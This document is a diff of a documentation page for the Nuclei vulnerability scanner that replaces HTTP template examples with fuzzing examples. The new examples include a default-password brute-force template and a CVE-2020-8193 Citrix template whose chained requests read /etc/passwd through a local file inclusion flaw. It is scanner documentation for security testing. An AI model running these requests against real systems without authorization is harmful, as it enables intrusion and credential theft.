@@ -15,7 +15,7 @@
     
     
       
-        <title>HTTP - Nuclei - Template based vulnerability scanner</title>
+        <title>Fuzzing - Nuclei - Template based vulnerability scanner</title>
       
     
     
@@ -58,7 +58,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#basic-template" class="md-skip">
+        <a href="#http-intruder-fuzzing" class="md-skip">
           Skip to content
         </a>
       
@@ -86,7 +86,7 @@
           </span>
           <span class="md-header-nav__topic md-ellipsis">
             
-              HTTP
+              Fuzzing
             
           </span>
         </div>
@@ -185,7 +185,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../guide/" class="md-tabs__link">
+        <a href="../../templating-guide/guide/" class="md-tabs__link">
           Templating Guide
         </a>
       
@@ -198,7 +198,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="./" class="md-tabs__link md-tabs__link--active">
+        <a href="../http/" class="md-tabs__link md-tabs__link--active">
           Template Examples
         </a>
       
@@ -211,7 +211,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../releases/releases/" class="md-tabs__link">
+        <a href="../../releases/changelog" class="md-tabs__link">
           Releases
         </a>
       
@@ -420,7 +420,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../guide/" title="Template Details" class="md-nav__link">
+    <a href="../../templating-guide/guide/" title="Template Details" class="md-nav__link">
       Template Details
     </a>
   </li>
@@ -462,84 +462,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        HTTP
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
-        </span>
-      </label>
-    
-    <a href="./" title="HTTP" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../http/" title="HTTP" class="md-nav__link">
       HTTP
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-      </span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#basic-template" class="md-nav__link">
-    Basic Template
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#multiple-matchers" class="md-nav__link">
-    Multiple matchers
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#matchers-with-conditions" class="md-nav__link">
-    Matchers with conditions
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#multiple-matcher-conditions" class="md-nav__link">
-    Multiple matcher conditions
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#custom-headers" class="md-nav__link">
-    Custom headers
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#post-requests" class="md-nav__link">
-    POST requests
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -571,11 +498,70 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../fuzzing/" title="Fuzzing" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Fuzzing
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
+        </span>
+      </label>
+    
+    <a href="./" title="Fuzzing" class="md-nav__link md-nav__link--active">
       Fuzzing
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#http-intruder-fuzzing" class="md-nav__link">
+    HTTP Intruder fuzzing
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fuzzing-multiple-requests" class="md-nav__link">
+    Fuzzing multiple requests
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authenticated-fuzzing" class="md-nav__link">
+    Authenticated fuzzing
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dynamic-variable-support" class="md-nav__link">
+    Dynamic variable support
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
         
@@ -627,7 +613,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../releases/releases/" title="Nuclei" class="md-nav__link">
+    <a href="../../releases/changelog" title="Nuclei" class="md-nav__link">
       Nuclei
     </a>
   </li>
@@ -662,43 +648,29 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#basic-template" class="md-nav__link">
-    Basic Template
+  <a href="#http-intruder-fuzzing" class="md-nav__link">
+    HTTP Intruder fuzzing
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#multiple-matchers" class="md-nav__link">
-    Multiple matchers
+  <a href="#fuzzing-multiple-requests" class="md-nav__link">
+    Fuzzing multiple requests
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#matchers-with-conditions" class="md-nav__link">
-    Matchers with conditions
+  <a href="#authenticated-fuzzing" class="md-nav__link">
+    Authenticated fuzzing
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#multiple-matcher-conditions" class="md-nav__link">
-    Multiple matcher conditions
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#custom-headers" class="md-nav__link">
-    Custom headers
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#post-requests" class="md-nav__link">
-    POST requests
+  <a href="#dynamic-variable-support" class="md-nav__link">
+    Dynamic variable support
   </a>
   
 </li>
@@ -715,7 +687,7 @@
             <article class="md-content__inner md-typeset">
               
                 
-                  <a href="https://github.com/projectdiscovery/nuclei/edit/master/docs/examples/http.md" title="Edit this page" class="md-content__button md-icon">
+                  <a href="https://github.com/projectdiscovery/nuclei/edit/master/docs/template-examples/fuzzing.md" title="Edit this page" class="md-content__button md-icon">
                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                   </a>
                 
@@ -723,169 +695,237 @@
                   
                 
                 
-                  <h1>HTTP</h1>
+                  <h1>Fuzzing</h1>
                 
-                <h3 id="basic-template">Basic Template<a class="headerlink" href="#basic-template" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">basic-example</span>
-
+                <h3 id="http-intruder-fuzzing">HTTP Intruder fuzzing<a class="headerlink" href="#http-intruder-fuzzing" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">multiple-raw-example</span>
 <span class="nt">info</span><span class="p">:</span>
-  <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Test HTTP Template</span>
+  <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Test RAW Template</span>
   <span class="nt">author</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">pdteam</span>
   <span class="nt">severity</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">info</span>
 
+<span class="c1"># HTTP Intruder fuzzing with in template payload support. </span>
+
 <span class="nt">requests</span><span class="p">:</span>
-  <span class="p p-Indicator">-</span> <span class="nt">method</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">GET</span>
-    <span class="nt">path</span><span class="p">:</span>
-      <span class="p p-Indicator">-</span> <span class="p p-Indicator">{{</span><span class="nv">BaseURL</span><span class="p p-Indicator">}}</span><span class="l l-Scalar l-Scalar-Plain">/</span>
+
+  <span class="p p-Indicator">-</span> <span class="nt">payloads</span><span class="p">:</span>
+      <span class="nt">username</span><span class="p">:</span> 
+      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">admin</span>
+
+      <span class="nt">password</span><span class="p">:</span> 
+      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">admin</span>
+      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">guest</span>
+      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">password</span>
+      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">test</span>
+      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">12345</span>
+      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">123456</span>
+
+    <span class="nt">attack</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">clusterbomb</span>
+
+    <span class="c1"># Available types: sniper, pitchfork and clusterbomb</span>
+
+    <span class="nt">raw</span><span class="p">:</span>
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">POST /?username={{username}}&amp;paramb={{password}} HTTP/1.1</span>
+        <span class="no">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5)</span>
+        <span class="no">Host: {{Hostname}}</span>
+        <span class="no">another_header: {{base64(&quot;password&quot;)}}</span>
+        <span class="no">Accept: */*</span>
+
+        <span class="no">body=test</span>
+
     <span class="nt">matchers</span><span class="p">:</span>
       <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">word</span>
         <span class="nt">words</span><span class="p">:</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;This</span><span class="nv"> </span><span class="s">is</span><span class="nv"> </span><span class="s">test</span><span class="nv"> </span><span class="s">matcher</span><span class="nv"> </span><span class="s">text&quot;</span>
+          <span class="p p-Indicator">-</span> <span class="s">&quot;Test</span><span class="nv"> </span><span class="s">is</span><span class="nv"> </span><span class="s">test</span><span class="nv"> </span><span class="s">matcher</span><span class="nv"> </span><span class="s">text&quot;</span>
 </code></pre></div>
 
-<h3 id="multiple-matchers">Multiple matchers<a class="headerlink" href="#multiple-matchers" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">http-multiple-matchers</span>
-
+<h3 id="fuzzing-multiple-requests">Fuzzing multiple requests<a class="headerlink" href="#fuzzing-multiple-requests" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">multiple-raw-example</span>
 <span class="nt">info</span><span class="p">:</span>
-  <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Test HTTP Template</span>
+  <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Test RAW Template</span>
   <span class="nt">author</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">pdteam</span>
   <span class="nt">severity</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">info</span>
 
 <span class="nt">requests</span><span class="p">:</span>
-  <span class="p p-Indicator">-</span> <span class="nt">method</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">GET</span>
-    <span class="nt">path</span><span class="p">:</span>
-      <span class="p p-Indicator">-</span> <span class="p p-Indicator">{{</span><span class="nv">BaseURL</span><span class="p p-Indicator">}}</span><span class="l l-Scalar l-Scalar-Plain">/</span>
+
+<span class="c1"># HTTP Intruder fuzzing wordlist based payload support. </span>
+
+  <span class="p p-Indicator">-</span> <span class="nt">payloads</span><span class="p">:</span>
+      <span class="nt">param_a</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">payloads/prams.txt</span>
+      <span class="nt">param_b</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">payloads/paths.txt</span>
+
+    <span class="nt">attack</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">clusterbomb</span>
+
+    <span class="c1"># Available types: sniper, pitchfork and clusterbomb</span>
+
+    <span class="nt">raw</span><span class="p">:</span>
+      <span class="c1"># Request with simple param and header manipulation with DSL functions</span>
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">POST /?param_a={{param_a}}&amp;paramb={{param_b}} HTTP/1.1</span>
+        <span class="no">User-Agent: {{param_a}}</span>
+        <span class="no">Host: {{Hostname}}</span>
+        <span class="no">another_header: {{base64(param_b)}}</span>
+        <span class="no">Accept: */*</span>
+
+        <span class="no">admin=test</span>
+
+      <span class="c1"># Request with body with DSL helper manipulation</span>
+
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">DELETE / HTTP/1.1</span>
+        <span class="no">User-Agent: nuclei</span>
+        <span class="no">Host: {{Hostname}}</span>
+
+        <span class="no">{{sha256(param_a)}} </span>
+
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">PUT / HTTP/1.1</span>
+        <span class="no">Host: {{Hostname}}</span>
+
+        <span class="no">{{html_escape(param_a)}} + {{hex_encode(param_b))}}</span>
+
     <span class="nt">matchers</span><span class="p">:</span>
       <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">word</span>
-        <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">php</span>
         <span class="nt">words</span><span class="p">:</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;X-Powered-By:</span><span class="nv"> </span><span class="s">PHP&quot;</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;PHPSESSID&quot;</span>
-        <span class="nt">part</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">header</span>
-
-      <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">word</span>
-        <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">node</span>
-        <span class="nt">words</span><span class="p">:</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;Server:</span><span class="nv"> </span><span class="s">NodeJS&quot;</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;X-Powered-By:</span><span class="nv"> </span><span class="s">nodejs&quot;</span>
-        <span class="nt">condition</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">or</span>
-        <span class="nt">part</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">header</span>
-
-      <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">word</span>
-        <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">python</span>
-        <span class="nt">words</span><span class="p">:</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;Python/2.&quot;</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;Python/3.&quot;</span>
-        <span class="nt">part</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">header</span>
+          <span class="p p-Indicator">-</span> <span class="s">&quot;Test</span><span class="nv"> </span><span class="s">is</span><span class="nv"> </span><span class="s">test</span><span class="nv"> </span><span class="s">matcher</span><span class="nv"> </span><span class="s">text&quot;</span>
 </code></pre></div>
 
-<h3 id="matchers-with-conditions">Matchers with conditions<a class="headerlink" href="#matchers-with-conditions" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">matchers-conditions</span>
-
+<h3 id="authenticated-fuzzing">Authenticated fuzzing<a class="headerlink" href="#authenticated-fuzzing" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">multiple-raw-example</span>
 <span class="nt">info</span><span class="p">:</span>
-  <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Test HTTP Template</span>
+  <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Test RAW Template</span>
   <span class="nt">author</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">pdteam</span>
   <span class="nt">severity</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">info</span>
 
 <span class="nt">requests</span><span class="p">:</span>
-  <span class="p p-Indicator">-</span> <span class="nt">method</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">GET</span>
-    <span class="nt">path</span><span class="p">:</span>
-      <span class="p p-Indicator">-</span> <span class="p p-Indicator">{{</span><span class="nv">BaseURL</span><span class="p p-Indicator">}}</span><span class="l l-Scalar l-Scalar-Plain">/</span>
+  <span class="p p-Indicator">-</span> <span class="nt">raw</span><span class="p">:</span>
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">GET / HTTP/1.1</span>
+        <span class="no">Host: {{Hostname}}</span>
+        <span class="no">Origin: {{BaseURL}}</span>
+        <span class="no">Connection: close</span>
+        <span class="no">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)</span>
+        <span class="no">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span>
+        <span class="no">Accept-Encoding: gzip, deflate</span>
+        <span class="no">Accept-Language: en-US,en;q=0.9</span>
 
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">POST /testing HTTP/1.1</span>
+        <span class="no">Host: {{Hostname}}</span>
+        <span class="no">Origin: {{BaseURL}}</span>
+        <span class="no">Connection: close</span>
+        <span class="no">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)</span>
+        <span class="no">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span>
+        <span class="no">Accept-Encoding: gzip, deflate</span>
+        <span class="no">Accept-Language: en-US,en;q=0.9</span>
+
+        <span class="no">testing=parameter</span>
+
+    <span class="c1"># Cookie-reuse maintain the session between all request like browser. </span>
+
+    <span class="nt">cookie-reuse</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
     <span class="nt">matchers</span><span class="p">:</span>
       <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">word</span>
         <span class="nt">words</span><span class="p">:</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;X-Powered-By:</span><span class="nv"> </span><span class="s">PHP&quot;</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;PHPSESSID&quot;</span>
-        <span class="nt">condition</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">and</span>
-        <span class="nt">part</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">header</span>
+          <span class="p p-Indicator">-</span> <span class="s">&quot;Test</span><span class="nv"> </span><span class="s">is</span><span class="nv"> </span><span class="s">test</span><span class="nv"> </span><span class="s">matcher</span><span class="nv"> </span><span class="s">text&quot;</span>
+</code></pre></div>
 
-      <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">word</span>
-        <span class="nt">words</span><span class="p">:</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;PHP&quot;</span>
+<h3 id="dynamic-variable-support">Dynamic variable support<a class="headerlink" href="#dynamic-variable-support" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">CVE-2020-8193</span>
+
+<span class="nt">info</span><span class="p">:</span>
+  <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Citrix unauthenticated LFI</span>
+  <span class="nt">author</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">pdteam</span>
+  <span class="nt">severity</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">high</span>
+
+  <span class="c1"># Source:- https://github.com/jas502n/CVE-2020-8193</span>
+  <span class="c1"># This template covers only the detection part, use the above exploit for the exploit confirmation.</span>
+
+<span class="nt">requests</span><span class="p">:</span>
+  <span class="p p-Indicator">-</span> <span class="nt">raw</span><span class="p">:</span>
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">POST /pcidss/report?type=allprofiles&amp;sid=loginchallengeresponse1requestbody&amp;username=nsroot&amp;set=1 HTTP/1.1</span>
+        <span class="no">Host: {{Hostname}}</span>
+        <span class="no">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+        <span class="no">Content-Type: application/xml</span>
+        <span class="no">X-NITRO-USER: xpyZxwy6</span>
+        <span class="no">X-NITRO-PASS: xWXHUJ56</span>
+
+        <span class="no">&lt;appfwprofile&gt;&lt;login&gt;&lt;/login&gt;&lt;/appfwprofile&gt;</span>
+
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">GET /menu/ss?sid=nsroot&amp;username=nsroot&amp;force_setup=1 HTTP/1.1</span>
+        <span class="no">Host: {{Hostname}}</span>
+        <span class="no">User-Agent: python-requests/2.24.0</span>
+        <span class="no">Accept-Encoding: gzip, deflate</span>
+        <span class="no">Accept: */*</span>
+        <span class="no">Connection: close</span>
+
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">GET /menu/neo HTTP/1.1</span>
+        <span class="no">Host: {{Hostname}}</span>
+        <span class="no">User-Agent: python-requests/2.24.0</span>
+        <span class="no">Accept-Encoding: gzip, deflate</span>
+        <span class="no">Accept: */*</span>
+        <span class="no">Connection: close</span>
+
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">GET /menu/stc HTTP/1.1</span>
+        <span class="no">Host: {{Hostname}}</span>
+        <span class="no">User-Agent: python-requests/2.24.0</span>
+        <span class="no">Accept-Encoding: gzip, deflate</span>
+        <span class="no">Accept: */*</span>
+        <span class="no">Connection: close</span>
+
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">POST /pcidss/report?type=allprofiles&amp;sid=loginchallengeresponse1requestbody&amp;username=nsroot&amp;set=1 HTTP/1.1</span>
+        <span class="no">Host: {{Hostname}}</span>
+        <span class="no">User-Agent: python-requests/2.24.0</span>
+        <span class="no">Accept-Encoding: gzip, deflate</span>
+        <span class="no">Accept: */*</span>
+        <span class="no">Connection: close</span>
+        <span class="no">Content-Type: application/xml</span>
+        <span class="no">X-NITRO-USER: oY39DXzQ</span>
+        <span class="no">X-NITRO-PASS: ZuU9Y9c1</span>
+        <span class="no">rand_key: randkey</span>
+
+        <span class="no">&lt;appfwprofile&gt;&lt;login&gt;&lt;/login&gt;&lt;/appfwprofile&gt;</span>
+
+      <span class="p p-Indicator">-</span> <span class="p p-Indicator">|</span>
+        <span class="no">POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1</span>
+        <span class="no">Host: {{Hostname}}</span>
+        <span class="no">User-Agent: python-requests/2.24.0</span>
+        <span class="no">Accept-Encoding: gzip, deflate</span>
+        <span class="no">Accept: */*</span>
+        <span class="no">Connection: close</span>
+        <span class="no">Content-Type: application/xml</span>
+        <span class="no">X-NITRO-USER: oY39DXzQ</span>
+        <span class="no">X-NITRO-PASS: ZuU9Y9c1</span>
+        <span class="no">rand_key: randkey</span>
+
+        <span class="no">&lt;clipermission&gt;&lt;/clipermission&gt;</span>
+
+    <span class="nt">cookie-reuse</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+
+    <span class="c1"># Using cookie-reuse to maintain session between each request, same as browser. </span>
+
+    <span class="nt">extractors</span><span class="p">:</span>
+      <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">regex</span>
+        <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">randkey</span>
         <span class="nt">part</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">body</span>
-</code></pre></div>
+        <span class="nt">internal</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">true</span>
+        <span class="nt">regex</span><span class="p">:</span>
+          <span class="p p-Indicator">-</span> <span class="s">&quot;(?m)[0-9]{3,10}\\.[0-9]+&quot;</span>
 
-<h3 id="multiple-matcher-conditions">Multiple matcher conditions<a class="headerlink" href="#multiple-matcher-conditions" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">multiple-matchers-conditions</span>
+        <span class="c1"># Using rand_key as dynamic variable to make use of extractors at run time.</span>
 
-<span class="nt">info</span><span class="p">:</span>
-  <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Test HTTP Template</span>
-  <span class="nt">author</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">pdteam</span>
-  <span class="nt">severity</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">info</span>
 
-<span class="nt">requests</span><span class="p">:</span>
-  <span class="p p-Indicator">-</span> <span class="nt">method</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">GET</span>
-    <span class="nt">path</span><span class="p">:</span>
-      <span class="p p-Indicator">-</span> <span class="p p-Indicator">{{</span><span class="nv">BaseURL</span><span class="p p-Indicator">}}</span><span class="l l-Scalar l-Scalar-Plain">/</span>
-
-    <span class="nt">matchers-condition</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">and</span>
     <span class="nt">matchers</span><span class="p">:</span>
-
-      <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">word</span>
-        <span class="nt">words</span><span class="p">:</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;X-Powered-By:</span><span class="nv"> </span><span class="s">PHP&quot;</span>
-          <span class="p p-Indicator">-</span> <span class="s">&quot;PHPSESSID&quot;</span>
-        <span class="nt">condition</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">or</span>
-        <span class="nt">part</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">header</span>
-
-      <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">word</span>
-        <span class="nt">words</span><span class="p">:</span>
-          <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">PHP</span>
+      <span class="p p-Indicator">-</span> <span class="nt">type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">regex</span>
+        <span class="nt">regex</span><span class="p">:</span>
+          <span class="p p-Indicator">-</span> <span class="s">&quot;root:[x*]:0:0:&quot;</span>
         <span class="nt">part</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">body</span>
-</code></pre></div>
-
-<h3 id="custom-headers">Custom headers<a class="headerlink" href="#custom-headers" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">custom-headers</span>
-
-<span class="nt">info</span><span class="p">:</span>
-  <span class="nt">name</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Test HTTP Template</span>
-  <span class="nt">author</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">pdteam</span>
-  <span class="nt">severity</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">info</span>
-
-<span class="nt">requests</span><span class="p">:</span>
-  <span class="p p-Indicator">-</span> <span class="nt">method</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">GET</span>
-
-    <span class="c1"># Example of sending some headers to the servers</span>
-
-    <span class="nt">headers</span><span class="p">:</span>
-
-      <span class="nt">X-Client-IP</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">127.0.0.1</span>
-      <span class="nt">X-Remote-IP</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">127.0.0.1</span>
-      <span class="nt">X-Remote-Addr</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">127.0.0.1</span>
-      <span class="nt">X-Forwarded-For</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">127.0.0.1</span>
-      <span class="nt">X-Originating-IP</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">127.0.0.1</span>
-
-    <span class="nt">path</span><span class="p">:</span>
